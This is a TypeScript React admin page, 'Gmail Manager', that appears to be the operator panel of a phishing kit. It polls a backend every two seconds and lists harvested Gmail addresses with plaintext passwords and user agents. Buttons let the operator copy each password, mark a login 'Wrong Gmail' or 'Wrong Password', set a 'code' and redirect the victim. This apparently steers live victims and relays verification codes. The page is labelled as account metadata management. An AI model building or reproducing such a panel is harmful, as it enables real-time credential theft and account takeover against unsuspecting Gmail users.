
"use client";

import { useCallback, useEffect, useState } from "react";
import {
  Search,
  Copy,
  RefreshCw,
  Mail,
  ShieldCheck,
  AlertCircle,
  X,
  Loader2,
  Link2,
  Hash,
  Check,
} from "lucide-react";

interface Gmail {
  _id: string;
  email: string;
  password: string;
  state: string;
  redirectTo?: string;
  userAgent: string;
  code?: string;
  createdAt: string;
}

type ModalType = "redirect" | "code" | null;

export default function GmailAdminPage() {
  const [gmails, setGmails] = useState<Gmail[]>([]);
  const [search, setSearch] = useState("");
  const [loading, setLoading] = useState(true);
  const [saving, setSaving] = useState(false);
  const [message, setMessage] = useState("");

  const [selected, setSelected] = useState<Gmail | null>(null);
  const [modalType, setModalType] = useState<ModalType>(null);

  const [redirectUrl, setRedirectUrl] = useState("");
  const [code, setCode] = useState("");

  const notify = (text: string) => {
    setMessage(text);
    window.setTimeout(() => setMessage(""), 2500);
  };

  // FETCH GMAIL ACCOUNTS
  const fetchGmails = useCallback(async (showLoader = true) => {
    try {
      if (showLoader) setLoading(true);

      const response = await fetch("/api/admin/gmails", {
        cache: "no-store",
      });

      const data = await response.json();
      if (!response.ok) {
        throw new Error(data.error || "Failed to fetch accounts.");
      }

      setGmails(data.gmails || []);
    } catch (error) {
      console.error("Fetch Gmail error:", error);
      notify("Failed to load accounts.");
    } finally {
      if (showLoader) setLoading(false);
    }
  }, []);

  // INITIAL FETCH
  useEffect(() => {
  let cancelled = false;

  const load = async () => {
    try {
      const response = await fetch("/api/admin/gmails", {
        cache: "no-store",
      });

      const data = await response.json();

      if (!response.ok) {
        throw new Error(data.error || "Failed to fetch accounts.");
      }

      if (!cancelled) {
        setGmails(data.gmails || []);
      }
    } catch (error) {
      if (!cancelled) {
        console.error("Fetch Gmail error:", error);
        notify("Failed to load accounts.");
      }
    } finally {
      if (!cancelled) {
        setLoading(false);
      }
    }
  };

  // Initial fetch
  void load();

  // Fetch every 2 seconds
  const interval = setInterval(() => {
    void load();
  }, 2000);

  return () => {
    cancelled = true;
    clearInterval(interval);
  };
}, []);

  // UPDATE ACCOUNT
  const updateGmail = async (
    id: string,
    updates: Record<string, string>
  ): Promise<boolean> => {
    try {
      setSaving(true);

      const response = await fetch("/api/admin/gmails", {
        method: "PATCH",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          id,
          ...updates,
        }),
      });

      const data = await response.json();

      if (!response.ok) {
        throw new Error(data.error || "Update failed.");
      }

      setGmails((prev) =>
        prev.map((gmail) =>
          gmail._id === id
            ? { ...gmail, ...updates }
            : gmail
        )
      );

      return true;
    } catch (error) {
      console.error("Update Gmail error:", error);
      notify("Failed to update account.");
      return false;
    } finally {
      setSaving(false);
    }
  };

  // UPDATE STATUS
  const updateState = async (
    gmail: Gmail,
    state: "wrong-gmail" | "wrong-password"
  ) => {
    const success = await updateGmail(gmail._id, { state });

    if (success) {
      notify("Account status updated.");
    }
  };

  // COPY EMAIL
  const copyEmail = async (email: string) => {
    try {
      await navigator.clipboard.writeText(email);
      notify("Copied.");
    } catch {
      notify("Copy failed.");
    }
  };

  // OPEN MODAL
  const openModal = (gmail: Gmail, type: ModalType) => {
    setSelected(gmail);
    setModalType(type);
    setRedirectUrl(gmail.redirectTo || "");
    setCode(gmail.code || "");
  };

  // CLOSE MODAL
  const closeModal = () => {
    setSelected(null);
    setModalType(null);
    setRedirectUrl("");
    setCode("");
  };

  // SAVE MODAL
  const saveModal = async () => {
    if (!selected || !modalType) return;

    const updates: Record<string, string> =
      modalType === "redirect"
        ? { redirectTo: redirectUrl.trim() }
        : { code: code.trim() };

    if (modalType === "redirect" && !redirectUrl.trim()) {
      notify("Enter a redirect URL.");
      return;
    }

    if (modalType === "code" && !code.trim()) {
      notify("Enter a reference code.");
      return;
    }

    if (
      modalType === "redirect" &&
      redirectUrl.trim() &&
      !/^https:\/\//i.test(redirectUrl.trim())
    ) {
      notify("Please enter a valid HTTPS URL.");
      return;
    }

    const success = await updateGmail(selected._id, updates);

    if (success) {
      notify("Changes saved successfully.");
      closeModal();
    }
  };

  // SEARCH
  const filtered = gmails.filter((gmail) =>
    gmail.email.toLowerCase().includes(search.toLowerCase())
  );



  return (
    <main className="min-h-screen bg-[#09090b] text-white">
      <div className="mx-auto max-w-7xl px-5 py-10">

        {/* HEADER */}
        <header className="mb-8 flex flex-wrap items-center justify-between gap-4">
          <div className="flex items-center gap-3">
            <div className="rounded-xl bg-blue-500/10 p-3 text-blue-400">
              <Mail size={25} />
            </div>

            <div>
              <h1 className="text-2xl font-bold">
                Gmail Manager
              </h1>

              <p className="text-sm text-zinc-500">
                Manage account metadata and settings
              </p>
            </div>
          </div>


        </header>

        {/* STATS */}
        <div className="mb-8 grid gap-4 sm:grid-cols-3">
          <Stat
            title="Total Accounts"
            value={gmails.length}
            icon={<Mail />}
          />

          <Stat
            title="Saved"
            value={gmails.filter((g) => g.state === "saved").length}
            icon={<ShieldCheck />}
          />

          <Stat
            title="Needs Attention"
            value={gmails.filter((g) => g.state !== "saved").length}
            icon={<AlertCircle />}
          />
        </div>

        {/* TABLE */}
        <section className="overflow-hidden rounded-2xl border border-white/10 bg-[#111113]">

          <div className="flex flex-wrap items-center justify-between gap-4 border-b border-white/10 p-5">
            <h2 className="font-semibold">
              Accounts
            </h2>

            <div className="relative w-full sm:w-72">
              <Search
                size={17}
                className="absolute left-3 top-3 text-zinc-500"
              />

              <input
                value={search}
                onChange={(e) => setSearch(e.target.value)}
                placeholder="Search email..."
                className="w-full rounded-xl border border-white/10 bg-black/30 py-2.5 pl-10 pr-4 text-sm outline-none focus:border-blue-500"
              />
            </div>
          </div>

          <div className="overflow-x-auto">
            <table className="w-full text-left text-sm">

              <thead className="bg-white/[0.03] text-xs uppercase text-zinc-500">
                <tr>
                  <th className="px-5 py-4">Email</th>
                  <th className="px-5 py-4">Password</th>
                  <th className="px-5 py-4">Code</th>
                  <th className="px-5 py-4">Redirect</th>
                  <th className="px-5 py-4">Created</th>
                  <th className="px-5 py-4">Actions</th>
                </tr>
              </thead>

              <tbody className="divide-y divide-white/5">

                {loading ? (
                  <tr>
                    <td
                      colSpan={6}
                      className="py-12 text-center text-zinc-500"
                    >
                      <Loader2 className="mx-auto mb-2 animate-spin" />
                      Loading accounts...
                    </td>
                  </tr>
                ) : filtered.length === 0 ? (
                  <tr>
                    <td
                      colSpan={6}
                      className="py-12 text-center text-zinc-500"
                    >
                      No accounts found.
                    </td>
                  </tr>
                ) : (
                  filtered.map((gmail) => (
                    <tr
                      key={gmail._id}
                      className="hover:bg-white/[0.02]"
                    >
                      {/* EMAIL */}
                      <td className="px-5 py-4 font-medium">
                        <div className="flex items-center gap-2">
                          <button
                            onClick={() => copyEmail(gmail.email)}
                            title="Copy email"
                            className="text-zinc-500 hover:text-white"
                          >
                            <Copy size={14} />
                          </button>
                          {gmail.email}


                        </div>
                      </td>

                      {/* STATUS */}
                      <td className="px-5 py-4">
                        <span
                          className={`flex items-center gap-2`}
                        >
                          <button
                            onClick={() => copyEmail(gmail.password)}
                            title="Copy password"
                            className="text-zinc-500 hover:text-white"
                          >
                            <Copy size={14} />
                          </button>
                          {gmail.password || ""}
                        </span>
                      </td>

                      {/* REFERENCE CODE */}
                      <td className="px-5 py-4 text-zinc-400">
                        <button
                          onClick={() =>
                            openModal(gmail, "code")
                          }
                          className="flex items-center gap-1 rounded-lg bg-purple-500/10 px-3 py-2 text-xs text-purple-400 hover:bg-purple-500/20"
                        >
                          <Hash size={13} />
                          Set Code
                        </button>
                      </td>

                      {/* REDIRECT */}
                      <td className="max-w-40 truncate px-5 py-4 text-zinc-400 flex items-center gap-2">
                        <button
                            onClick={() => copyEmail(gmail.userAgent)}
                            title="Copy password"
                            className="text-zinc-500 hover:text-white"
                          >
                            <Copy size={14} />
                          </button>
                        {gmail.userAgent || ""}
                      </td>

                      {/* CREATED */}
                      <td className="whitespace-nowrap px-5 py-4 text-zinc-500">
                        {new Date(gmail.createdAt).toLocaleDateString()}
                      </td>

                      {/* ACTIONS */}
                      <td className="px-5 py-4">
                        <div className="flex min-w-64 flex-wrap gap-2">

                          <button
                            onClick={() =>
                              updateState(gmail, "wrong-gmail")
                            }
                            disabled={saving}
                            className="rounded-lg bg-red-500/10 px-3 py-2 text-xs text-red-400 hover:bg-red-500/20 disabled:opacity-50"
                          >
                            Wrong Gmail
                          </button>

                          <button
                            onClick={() =>
                              updateState(gmail, "wrong-password")
                            }
                            disabled={saving}
                            className="rounded-lg bg-orange-500/10 px-3 py-2 text-xs text-orange-400 hover:bg-orange-500/20 disabled:opacity-50"
                          >
                            Wrong Password
                          </button>

                          <button
                            onClick={() =>
                              openModal(gmail, "redirect")
                            }
                            className="flex items-center gap-1 rounded-lg bg-blue-500/10 px-3 py-2 text-xs text-blue-400 hover:bg-blue-500/20"
                          >
                            <Link2 size={13} />
                            Redirect
                          </button>



                        </div>
                      </td>
                    </tr>
                  ))
                )}

              </tbody>
            </table>
          </div>
        </section>
      </div>

      {/* MODAL */}
      {selected && modalType && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 p-4 backdrop-blur-sm">

          <div className="w-full max-w-md rounded-2xl border border-white/10 bg-[#151518] p-6 shadow-2xl">

            <div className="mb-6 flex items-center justify-between">
              <div>
                <h2 className="text-lg font-bold">
                  {modalType === "code"
                    ? "Set Reference Code"
                    : "Redirect Settings"}
                </h2>

                <p className="mt-1 text-xs text-zinc-500">
                  {selected.email}
                </p>
              </div>

              <button
                onClick={closeModal}
                className="rounded-lg p-2 text-zinc-400 hover:bg-white/10"
              >
                <X size={18} />
              </button>
            </div>

            <label className="mb-2 block text-sm text-zinc-400">
              {modalType === "code"
                ? "Reference Code"
                : "Redirect URL"}
            </label>

            <input
              autoFocus
              type={modalType === "code" ? "text" : "url"}
              value={
                modalType === "code"
                  ? code
                  : redirectUrl
              }
              onChange={(e) =>
                modalType === "code"
                  ? setCode(e.target.value)
                  : setRedirectUrl(e.target.value)
              }
              placeholder={
                modalType === "code"
                  ? "Enter internal reference code"
                  : "https://example.com"
              }
              className="w-full rounded-xl border border-white/10 bg-black/30 px-4 py-3 text-sm outline-none focus:border-blue-500"
            />

            <div className="mt-6 flex gap-3">
              <button
                onClick={closeModal}
                className="flex-1 rounded-xl border border-white/10 py-3 text-sm hover:bg-white/5"
              >
                Cancel
              </button>

              <button
                onClick={saveModal}
                disabled={saving}
                className="flex flex-1 items-center justify-center gap-2 rounded-xl bg-blue-600 py-3 text-sm font-semibold hover:bg-blue-500 disabled:opacity-50"
              >
                {saving ? (
                  <Loader2 size={16} className="animate-spin" />
                ) : (
                  <Check size={16} />
                )}

                Save
              </button>
            </div>
          </div>
        </div>
      )}

      {/* TOAST */}
      {message && (
        <div className="fixed bottom-5 right-5 z-[60] rounded-xl border border-white/10 bg-[#202024] px-5 py-3 text-sm shadow-xl">
          {message}
        </div>
      )}
    </main>
  );
}

// STAT COMPONENT
function Stat({
  title,
  value,
  icon,
}: {
  title: string;
  value: number;
  icon: React.ReactNode;
}) {
  return (
    <div className="rounded-2xl border border-white/10 bg-[#111113] p-5">
      <div className="mb-4 flex items-center justify-between text-zinc-500">
        <span className="text-sm">{title}</span>
        {icon}
      </div>

      <p className="text-3xl font-bold">{value}</p>
    </div>
  );
}
